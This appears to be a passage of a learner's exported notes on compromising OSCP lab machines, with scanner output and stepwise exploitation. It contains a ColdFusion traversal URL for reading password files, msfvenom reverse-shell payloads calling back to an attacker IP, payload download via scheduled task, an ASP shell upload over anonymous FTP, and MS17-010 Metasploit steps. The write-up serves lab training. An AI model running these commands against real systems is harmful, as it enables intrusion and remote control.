href="http://www.securityfocus.com/bid/1314.">http://www.securityfocus.com/bid/1314.</a><br />+ Cookie CFAUTHORIZATION_componentutils created without the httponly flag<br />+ /CFIDE/componentutils/cfcexplorer.cfc: ColdFusion Component Browser. Default password may be &#39;admin&#39;.<br />+ Cookie JSESSIONID created without the httponly flag<br />+ /flex2gateway/http: Adobe BlazeDS identified.<br />+ 7517 requests: 0 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2019-11-20 18:18:40 (GMT-5) (461 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>nmap http</h1><br/>root@kali:~/Desktop/Machines/OSCP/10/ColdFusion-Vulnerability-Scanner# nmap -vv --reason -Pn -sV -p 80 --script=&quot;banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&quot; 10.11.1.10<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 19:16 EST<br />NSE: Loaded 166 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 19:16<br />Completed NSE at 19:16, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 19:16<br />Completed NSE at 19:16, 0.00s elapsed<br />Initiating ARP Ping Scan at 19:16<br />Scanning 10.11.1.10 [1 port]<br />Completed ARP Ping Scan at 19:16, 0.09s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 19:16<br />Completed Parallel DNS resolution of 1 host. at 19:16, 0.03s elapsed<br />Initiating SYN Stealth Scan at 19:16<br />Scanning 10.11.1.10 [1 port]<br />Discovered open port 80/tcp on 10.11.1.10<br />Completed SYN Stealth Scan at 19:16, 0.08s elapsed (1 total ports)<br />Initiating Service scan at 19:16<br />Scanning 1 service on 10.11.1.10<br />Completed Service scan at 19:16, 6.10s elapsed (1 service on 1 host)<br />NSE: Script scanning 10.11.1.10.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 19:16<br />NSE Timing: About 99.68% done; ETC: 19:17 (0:00:00 remaining)<br />NSE Timing: About 99.68% done; ETC: 19:17 (0:00:00 remaining)<br />NSE Timing: About 99.68% done; ETC: 19:18 (0:00:00 remaining)<br />NSE Timing: About 99.68% done; ETC: 19:18 (0:00:00 remaining)<br />NSE Timing: About 99.68% done; ETC: 19:19 (0:00:00 remaining)<br />NSE Timing: About 99.68% done; ETC: 19:19 (0:00:01 remaining)<br />Completed NSE at 19:20, 197.38s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 19:20<br />Completed NSE at 19:20, 1.00s elapsed<br />Nmap scan report for 10.11.1.10<br />Host is up, received arp-response (0.049s latency).<br />Scanned at 2019-11-20 19:16:45 EST for 205s<br /><br />PORT   STATE SERVICE REASON          VERSION<br />80/tcp open  http    syn-ack ttl 128 Microsoft IIS httpd 6.0<br />|_http-chrono: Request times for /; avg: 245.51ms; min: 152.89ms; max: 610.71ms<br />| http-comments-displayer: <br />| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.11.1.10<br />|     <br />|     Path: <a href="http://10.11.1.10:80/">http://10.11.1.10:80/</a><br />|     Line number: 20<br />|     Comment: <br />|         &lt;!--Probable causes:&lt;--&gt;<br />|     <br />|     Path: <a href="http://10.11.1.10:80/">http://10.11.1.10:80/</a><br />|     Line number: 18<br />|     Comment: <br />|_        &lt;!--Problem--&gt;<br />| http-cookie-flags: <br />|   /CFIDE/administrator/enter.cfm: <br />|     CFID: <br />|       httponly flag not set<br />|     CFTOKEN: <br />|       httponly flag not set<br />|   /CFIDE/administrator/entman/index.cfm: <br />|     CFID: <br />|       httponly flag not set<br />|     CFTOKEN: <br />|       httponly flag not set<br />|   /CFIDE/administrator/archives/index.cfm: <br />|     CFID: <br />|       httponly flag not set<br />|     CFTOKEN: <br />|_      httponly flag not set<br />|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.<br />|_http-date: Thu, 21 Nov 2019 00:16:48 GMT; -4s from local time.<br />|_http-devframework: Couldn&#39;t determine the underlying framework or CMS. Try increasing &#39;httpspider.maxpagecount&#39; value to spider more pages.<br />|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.<br />|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=&lt;number|all&gt; for deeper analysis)<br />| http-enum: <br />|   /CFIDE/administrator/enter.cfm: ColdFusion Admin Console<br />|   /CFIDE/administrator/entman/index.cfm: ColdFusion Admin Console<br />|   /cfide/install.cfm: ColdFusion Admin Console<br />|   /CFIDE/administrator/archives/index.cfm: ColdFusion Admin Console<br />|   /CFIDE/wizards/common/_logintowizard.cfm: ColdFusion Admin Console<br />|_  /CFIDE/componentutils/login.cfm: ColdFusion Admin Console<br />|_http-errors: Couldn&#39;t find any error pages.<br />|_http-feed: Couldn&#39;t find any feeds.<br />|_http-fetch: Please enter the complete path of the directory to save data in.<br />| http-headers: <br />|   Content-Length: 1433<br />|   Content-Type: text/html<br />|   Content-Location: <a href="http://10.11.1.10/iisstart.htm">http://10.11.1.10/iisstart.htm</a><br />|   Last-Modified: Sat, 22 Feb 2003 01:48:30 GMT<br />|   Accept-Ranges: bytes<br />|   ETag: &quot;06be97f14dac21:38e&quot;<br />|   Server: Microsoft-IIS/6.0<br />|   Date: Thu, 21 Nov 2019 00:16:52 GMT<br />|   Connection: close<br />|   <br />|_  (Request type: HEAD)<br />|_http-iis-webdav-vuln: WebDAV is DISABLED. Server is not currently vulnerable.<br />|_http-jsonp-detection: Couldn&#39;t find any JSONP endpoints.<br />|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable<br />|_http-malware-host: Host appears to be clean<br />| http-methods: <br />|   Supported Methods: OPTIONS TRACE GET HEAD POST<br />|_  Potentially risky methods: TRACE<br />|_http-mobileversion-checker: No mobile version detected.<br />| http-php-version: Logo query returned unknown hash d36ef6356fa2aa546f1da2bb003c17b1<br />|_Credits query returned unknown hash d36ef6356fa2aa546f1da2bb003c17b1<br />|_http-referer-checker: Couldn&#39;t find any cross-domain scripts.<br />|_http-security-headers: <br />|_http-server-header: Microsoft-IIS/6.0<br />| http-sitemap-generator: <br />|   Directory structure:<br />|     /<br />|       Other: 1; gif: 1<br />|   Longest directory structure:<br />|     Depth: 0<br />|     Dir: /<br />|   Total files found (by extension):<br />|_    Other: 1; gif: 1<br />|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.<br />|_http-title: Under Construction<br />| http-useragent-tester: <br />|   Status for browser useragent: 200<br />|   Allowed User Agents: <br />|     Mozilla/5.0 (compatible; Nmap Scripting Engine; <a href="https://nmap.org/book/nse.html)">https://nmap.org/book/nse.html)</a><br />|     libwww<br />|     lwp-trivial<br />|     libcurl-agent/1.0<br />|     PHP/<br />|     Python-urllib/2.5<br />|     GT::WWW<br />|     Snoopy<br />|     MFC_Tear_Sample<br />|     HTTP::Lite<br />|     PHPCrawl<br />|     URI::Fetch<br />|     Zend_Http_Client<br />|     http client<br />|     PECL::HTTP<br />|     Wget/1.13.4 (linux-gnu)<br />|_    WWW-Mechanize/1.34<br />| http-vhosts: <br />|_127 names had status 200<br />| http-vuln-cve2010-2861: <br />|   VULNERABLE:<br />|   Adobe ColdFusion Directory Traversal Vulnerability<br />|     State: VULNERABLE (Exploitable)<br />|     IDs:  OSVDB:67047  CVE:CVE-2010-2861<br />|       Multiple directory traversal vulnerabilities in the administrator console<br />|       in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the<br />|       locale parameter<br />|     Disclosure date: 2010-08-10<br />|     Extra information:<br />|       <br />|     CFusionMX<br />|       Not vulnerable<br />|     ColdFusion8<br />|       HMAC: A88B51DF6F615DD3D445B1A7C5947B7412D520B3<br />|       Salt: 1574295411113<br />|       Hash: AAFDC23870ECBCD3D557B6423A8982134E17927E<br />|     CFusionMX7<br />|       Not vulnerable<br />|     JRun4\servers<br />|       Not vulnerable<br />|   <br />|     References:<br />|       <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2861">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2861</a><br />|       <a href="http://www.nessus.org/plugins/index.php?view=single&id=48340">http://www.nessus.org/plugins/index.php?view=single&amp;id=48340</a><br />|       <a href="http://www.blackhatacademy.org/security101/Cold_Fusion_Hacking">http://www.blackhatacademy.org/security101/Cold_Fusion_Hacking</a><br />|       <a href="http://osvdb.org/67047">http://osvdb.org/67047</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861</a><br />|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=&lt;number|all&gt; for deeper analysis)<br />|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#39;t find wp-login.php<br />MAC Address: 00:50:56:93:4E:DC (VMware)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 2) scan.<br />Initiating NSE at 19:20<br />Completed NSE at 19:20, 0.00s elapsed<br />NSE: Starting runlevel 2 (of 2) scan.<br />Initiating NSE at 19:20<br />Completed NSE at 19:20, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 205.13 seconds<br />           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)<br />root@kali:~/Desktop/Machines/OSCP/10/ColdFusion-Vulnerability-Scanner# nmap -vv --reason -Pn -sV -p 80 --script=&quot;banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&quot; 10.11.1.10<br /></div><div class='page'><h1 class='title level-5'>proof</h1><br/>a416a831fddf36aa8c01ba0674ca7bf8 </div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/436-1.png" alt="images/436-1.png" /></a></div><div class='page'><h1 class='title level-5'>10.11.1.10</h1><br/>used auxiliary/scanner/http/coldfusion_locale_traversal because I found that coldfusion 8.0.1 was on the machine. This gave me <br /> URL: 10.11.1.10/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%00en<br /><br />When I went to that directory I found a hash I went to a hash decrypter on the internet and got the password “pass123”. It was successful when submitted.<br />I then searched for coldfusion on hackingarticles.in and found the artic walkthrough that looked very similar.<br />created a payload with msfvenom -p java/jsp_shell_reverse_tcp lhost=10.11.0.169 lport=6969 -f raw &gt; root/Desktop/Shell.jsp<br />hosted the payload with python -m SimpleHTTPServer 80<br />made a scheduled task that would download the Shell.jsp from my webserver C:\coldfusion8\wwwroot\Shell.jsp<br />msf exploit/multi/handler with payload of java/jsp_shell_reverse_tp<br />went to 10.11.1.10 and ran the shellcode that was downloaded<br />I now have a shell<br /><br />systeminfo<br />    Host Name:                 MIKE<br />OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition<br />OS Version:                5.2.3790 Service Pack 2 Build 3790<br />OS Manufacturer:           Microsoft Corporation<br />OS Configuration:          Standalone Server<br />OS Build Type:             Uniprocessor Free<br />Registered Owner:          Offsec<br />Registered Organization:   lab<br />Product ID:                69712-296-3669387-44706<br />Original Install Date:     9/21/2011, 6:34:25 AM<br />System Up Time:            192 Days, 22 Hours, 16 Minutes, 6 Seconds<br />System Manufacturer:       VMware, Inc.<br />System Model:              VMware Virtual Platform<br />System Type:               X86-based PC<br />Processor(s):              1 Processor(s) Installed.<br />                           [01]: x86 Family 6 Model 44 Stepping 2 GenuineIntel ~3457 Mhz<br />BIOS Version:              INTEL  - 6040000<br />Windows Directory:         C:\WINDOWS<br />System Directory:          C:\WINDOWS\system32<br />Boot Device:               \Device\HarddiskVolume1<br />System Locale:             en-us;English (United States)<br />Input Locale:              en-us;English (United States)<br />Time Zone:                 (GMT-08:00) Pacific Time (US &amp; Canada)<br />Total Physical Memory:     1,023 MB<br />Available Physical Memory: 553 MB<br />Page File: Max Size:       2,470 MB<br />Page File: Available:      2,102 MB<br />Page File: In Use:         368 MB<br />Page File Location(s):     C:\pagefile.sys<br />Domain:                    WORKGROUP<br />Logon Server:              N/A<br />Hotfix(s):                 275 Hotfix(s) Installed.<br /><br /><br /><br />PROOF = a416a831fddf36aa8c01ba0674ca7bf8<br /><br /><br /><br /><br /><br />attempted to upgrade shell during post exploitation with <br />use post/multi/manage/shell_to_meterpreter <br />#failed<br />attempted to use exploit/multi/script/web_delivery<br />#failed<br />attempted to use exploit/windows/local/ms15_051_client_copy_image<br />#failed (not sure how to get a meterprter session when I already have a reverse shell session. I guress it is not that <br />important.<br /><br /><br /><br />exploitdb exploit 14641 and netcat will do all the things you need. metasploit not neccessary.<br /><br /><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>13,14 Bob</h1><br/>nmap showed that 21, 80, 3389 were all open<br />21 allowed ftp annonymous login... and we are in!!<br />I navigated to wwwroot and saw that I could upload files with put<br />used msf to make an asp shellcode (I knew asp because there was a .asp file already in there)<br />bi          to upload as binary<br />put shell.asp<br />started nc listener<br />navigated to 10.11.1.13/shell.asp<br />boom!! shell<br /><br />PRIVESC<br />ran systeminfo, copied results into 13.txt (on kali)<br />ran ./wes.py 13.txt and saw that the machine was vulnerable to CVE: CVE-2017-0143 KB: KB4012598 otherwise known as MS17-010 or eternal blue!!<br />445 was closed to the kali, so I used plink to tunnel the 445 traffic to myself<br />put plink (with ftp)<br />cd to wwwroot dir<br />plink -R 445:localhost:445 root@10.11.0.186      to <strong>forward 445</strong> traffic on the <strong>localhost </strong>to <strong>open</strong> 445 to <strong>10.11.0.186</strong>   <br />nmap -p 445 10.11.1.13    to verify we can hit 445... open.... boom!!<br /><br />used metasploit to finish<br />use exploit/windows/smb/ms17_010_psexec<br />set dbgtrace true<br />set verbose true<br />set rhost 127.0.0.1<br />set lhost 10.11.0.186<br />set lport 4444<br />run...<br />rooted</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/>msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.186 lport=443 -f asp -a x86 --platform win  &gt; Shell.asp<br />msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.186 lport=8080 -f asp -a x86 --platform win  &gt; Shell2.asp</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.13<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-14 14:32 EST<br />Nmap scan report for 10.11.1.13<br />Host is up (0.055s latency).<br />Not shown: 997 filtered ports<br />PORT     STATE SERVICE<br />21/tcp   open  ftp<br />80/tcp   open  http<br />3389/tcp open  ms-wbt-server<br />MAC Address: 00:50:56:89:7C:AF (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 9.00 seconds<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />nmap -sC -sV -p- 10.11.1.13<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-14 14:32 EST<br />Nmap scan report for 10.11.1.13<br />Host is up (0.038s latency).<br />Not shown: 65531 filtered ports<br />PORT      STATE  SERVICE        VERSION<br />21/tcp    open   ftp            Microsoft ftpd<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />| 01-17-07  06:42PM       &lt;DIR&gt;          AdminScripts<br />| 01-17-07  06:43PM       &lt;DIR&gt;          ftproot<br />| 01-17-07  06:43PM       &lt;DIR&gt;          iissamples<br />| 01-17-07  06:43PM       &lt;DIR&gt;          Scripts<br />| 11-14-19  04:16AM                16332 WinPrivCheck.bat<br />|_11-14-19  07:33PM       &lt;DIR&gt;          wwwroot<br />| ftp-syst: <br />|_  SYST: Windows_NT<br />80/tcp    open   tcpwrapped<br />| http-methods: <br />|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT<br />|_http-server-header: Microsoft-IIS/5.1<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />| http-webdav-scan: <br />|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH<br />|   Server Type: Microsoft-IIS/5.1<br />|   Server Date: Thu, 14 Nov 2019 19:34:52 GMT<br />|   WebDAV type: Unkown<br />|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK<br />3389/tcp  open   ms-wbt-server?<br />13321/tcp closed unknown<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port3389-TCP:V=7.70%I=7%D=11/14%Time=5DCDAC60%P=i686-pc-linux-gnu%r(Ter<br />SF:minalServerCookie,B,&quot;\x03\0\0\x0b\x06\xd0\0\0\x124\0&quot;);<br />MAC Address: 00:50:56:89:7C:AF (VMware)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 181.07 seconds<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.11.1.13:80">http://10.11.1.13:80</a> | tee nikto_10.11.1.13:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.13<br />+ Target Hostname:    10.11.1.13<br />+ Target Port:        80<br />+ Start Time:         2019-11-14 14:33:20 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/5.1<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ OSVDB-397: HTTP method &#39;PUT&#39; allows clients to save files on the web server.<br />+ OSVDB-5646: HTTP method &#39;DELETE&#39; allows clients to delete files on the web server.<br />+ Retrieved dasl header: &lt;DAV:sql&gt;<br />+ Retrieved dav header: 1, 2<br />+ Retrieved ms-author-via header: DAV<br />+ Uncommon header &#39;ms-author-via&#39; found, with contents: DAV<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH <br />+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5647: HTTP method (&#39;Allow&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.<br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH <br />+ OSVDB-5646: HTTP method (&#39;Public&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.<br />+ OSVDB-397: HTTP method (&#39;Public&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.<br />+ OSVDB-5647: HTTP method (&#39;Public&#39; Header): &#39;MOVE&#39; may allow clients to change file locations on the web server.<br />+ WebDAV enabled (COPY MKCOL SEARCH LOCK UNLOCK PROPPATCH PROPFIND listed as allowed)<br />+ OSVDB-13431: PROPFIND HTTP verb may show the server&#39;s internal IP address: <a href="http://bob/scripts/">http://bob/scripts/</a><br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-3092: /scripts/: This might be interesting... possibly a system shell found.<br />+ Cookie ASPSESSIONIDGQGGQICU created without the httponly flag<br />+ OSVDB-3092: /iishelp/iis/misc/default.asp: Default IIS page found.<br />+ 8364 requests: 0 error(s) and 24 item(s) reported on remote host<br />+ End Time:           2019-11-14 14:48:41 (GMT-5) (921 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.13:80">http://10.11.1.13:80</a> --simple-report dirsearchsimple_10.11.1.13:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-14_14-33-21.log<br /><br />Target: <a href="http://10.11.1.13:80">http://10.11.1.13:80</a><br /><br />[14:33:21] Starting: <br />[14:33:23] 200 -  162B  - /scripts/<br />[14:33:32] 401 -   24B  - /printers/<br />[14:33:48] 401 -   24B  - /Printers/<br />[14:34:07] 200 -  162B  - /Scripts/<br />[14:34:59] 403 -  152B  - /chevrolet/<br />[14:35:00] 403 -  152B  - /video_icon/<br />[14:35:00] 403 -  152B  - /kuang2/<br />[14:38:44] 403 -  152B  - /carpenter.php<br />[14:51:09] 200 -  162B  - /SCRIPTS/<br /></div><div class='page'><h1 class='title level-5'>proof</h1><br/>C:\Documents and Settings\Administrator\Desktop&gt;type proof.txt<br />type proof.txt<br />a26f37da4583ff68f44d133d12ae3459 </div><div class='page'><h1 class='title level-5'>10.11.1.13</h1><br/>Bob<br />Ftp allowed username annonymous, no password login<br />generated shellcode<br />    msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.169 lport=80 -f asp -a x86 --platform win  &gt; Shell80x86_2.asp<br />put shellcode in place I could exicute<br />    cd wwwroot<br />    pwd    <br />    put ~/Desktop Shell80x86_2.asp Shell80x86_2.asp<br />execute shellcode<br />    nc -nlv 10.11.1.13 -p 80    <br />    navigate to 10.11.1.13/shell80x86_2.asp and click. I now have a shell that does not have admin privlidges<br />    <br />    <br />    <br />check for vulnerable services<br />    sc query state= all  (copy to text)<br />    cat text | grep -i service_name | sort -u | awk ‘{print “binpath= ” $3}’ &gt; text2        <br />    text2 | awk ‘{print “cacls ” $3}’<br />    <br />    <br />    ^^this has not been tested but the theroy is there. moral of the story is find a builtin user with permissions greater than R<br />    <br />    <br />    <br />    <br />    portfwd flush<br />    cat openportnum | awk &#39;{print &quot;portfwd add -l 5&quot; $2 &quot; -p &quot;$2 &quot; -r 0.0.0.0&quot;}&#39;<br />    portfwd list<br />    <br />    nmap -sT -Pn -A -p 521-53047 0.0.0.0<br />    <br />    <br />info<br />netbios name    bob<br />domain              acme<br /><br />    Microsoft Windows XP [Version 5.1.2600]<br />(C) Copyright 1985-2001 Microsoft Corp.<br /><br />C:\WINDOWS\system32&gt;sc query<br />sc query<br /><br />SERVICE_NAME: ALG<br />DISPLAY_NAME: Application Layer Gateway Service<br />        TYPE               : 10  WIN32_OWN_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: AudioSrv<br />DISPLAY_NAME: Windows Audio<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (NOT_STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Browser<br />DISPLAY_NAME: Computer Browser<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: COMSysApp<br />DISPLAY_NAME: COM+ System Application<br />        TYPE               : 10  WIN32_OWN_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: CryptSvc<br />DISPLAY_NAME: Cryptographic Services<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: dmserver<br />DISPLAY_NAME: Logical Disk Manager<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Dnscache<br />DISPLAY_NAME: DNS Client<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Eventlog<br />DISPLAY_NAME: Event Log<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (NOT_STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: EventSystem<br />DISPLAY_NAME: COM+ Event System<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: IISADMIN<br />DISPLAY_NAME: IIS Admin<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: lanmanserver<br />DISPLAY_NAME: Server<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: lanmanworkstation<br />DISPLAY_NAME: Workstation<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: LmHosts<br />DISPLAY_NAME: TCP/IP NetBIOS Helper<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,IGNORES_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: Messenger<br />DISPLAY_NAME: Messenger<br />        TYPE               : 20  WIN32_SHARE_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br />SERVICE_NAME: MSDTC<br />DISPLAY_NAME: Distributed Transaction Coordinator<br />        TYPE               : 10  WIN32_OWN_PROCESS <br />        STATE              : 4  RUNNING <br />                                (STOPPABLE,NOT_PAUSABLE,ACCEPTS_SHUTDOWN)<br />        WIN32_EXIT_CODE    : 0	(0x0)<br />        SERVICE_EXIT_CODE  : 0	(0x0)<br />        CHECKPOINT         : 0x0<br />        WAIT_HINT          : 0x0<br /><br 